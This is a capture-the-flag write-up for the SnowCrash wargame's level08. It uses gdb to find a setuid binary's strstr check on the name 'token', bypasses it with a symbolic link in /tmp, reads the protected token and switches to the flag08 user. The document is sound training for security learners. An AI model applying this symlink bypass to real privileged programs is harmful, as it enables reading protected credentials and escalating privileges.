# LEVEL08

## Analysis
First of, let's check what we have:
```bash
    level08@SnowCrash:~$ ls -la
    total 28
    dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
    -r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -r-x------  1 level08 level08  675 Apr  3  2012 .profile
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

We have a bin we can run "level08" to read another file but we have not access to "token":
```bash
    level08@SnowCrash:~$ ./level08
    ./level08 [file to read]
    level08@SnowCrash:~$ ./level08 token
    You may not access 'token'
    level08@SnowCrash:~$ ./level08 .profile
    level08: Unable to open .profile: Permission denied
```

There must be a specific protection to prevent us to read "token" because the err is different 
from a file on which we have no rights. We should try to create a symbolic link with another file
but first let's take a look at the main.

If we run gdb on "level08" and disassemble the main we can find a cmp here:
```
    [...]
    0x080485af <+91>:    mov    DWORD PTR [esp+0x4],0x8048793
    0x080485b7 <+99>:    mov    DWORD PTR [esp],eax
    0x080485ba <+102>:   call   0x8048400 <strstr@plt>
    0x080485bf <+107>:   test   eax,eax
    0x080485c1 <+109>:   je     0x80485e9 <main+149>
    [...]
```
And if we print the value we find the string "token" which means we have to name our file differently:
```
    (gdb) b *0x080485af
    Breakpoint 1 at 0x80485af: file level08.c, line 18.
    (gdb) run
    Starting program: /home/user/level08/level08 
    /home/user/level08/level08 [file to read]
    [Inferior 1 (process 3303) exited with code 01]
    (gdb) x/s 0x8048793
    0x8048793:       "token"
```

## Solution

So let's now try the command "ln -s <full path to file> <path to new file>":
```bash
    level08@SnowCrash:~$ ln -s  /home/user/level08/token /tmp/flag
    level08@SnowCrash:~$ ./level08 /tmp/flag
    XXXXXXXXXXXXXXXXXXXXXXXXXX
```

And here we are:
```bash
    level08@SnowCrash:~$ su flag08
    Password: 
    Don't forget to launch getflag !
    flag08@SnowCrash:~$ getflag
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```
